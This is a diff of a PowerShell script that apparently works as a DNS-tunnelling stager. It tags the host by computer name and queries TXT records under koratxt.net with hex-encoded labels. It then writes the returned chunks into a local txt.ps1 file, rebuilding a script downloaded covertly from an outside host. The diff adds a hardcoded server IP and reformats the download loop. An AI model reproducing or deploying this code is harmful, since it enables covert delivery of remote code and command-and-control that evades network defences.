@@ -1,4 +1,5 @@
-﻿$name = 'koratxt.net'
+﻿$server = '54.156.28.185'
+$name = 'koratxt.net'
 $id = Get-Content env:computername
 if ($id.Length -gt 10) {
     $id = $id.Substring(0,10)
@@ -48,7 +49,11 @@ function pull_file($size=255){
     $h = ''
     $index = 0
     $file_size = $(Resolve-DnsName -Name "73697a65.$name" -Type TXT).Strings
-    foreach ($i in 1..[int]"$file_size") {        $x = $(Resolve-DnsName -Name "66696c65.$index.$name" -Type TXT).Strings        $index += $size        $x | Add-Content -Path '.\txt.ps1'    }
+    foreach ($i in 1..[int]"$file_size") {
+        $x = $(Resolve-DnsName -Name "66696c65.$index.$name" -Type TXT).Strings
+        $index += $size    
+        $x | Add-Content -Path '.\txt.ps1'
+    }
     $(Resolve-DnsName -Name "656e64.$name" -Type TXT)
 }
 
